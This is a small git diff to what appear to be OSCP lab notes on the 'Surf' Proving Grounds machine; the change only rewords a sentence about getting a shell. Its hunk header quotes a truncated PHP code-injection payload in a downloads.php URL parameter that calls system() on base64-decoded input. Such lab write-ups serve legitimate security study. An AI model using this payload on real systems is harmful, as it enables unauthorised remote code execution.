@@ -108,6 +108,6 @@ http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_d
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h22m10s_011_.png)
 
-We get the shell successfully.
+Getting the shell successfully.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)
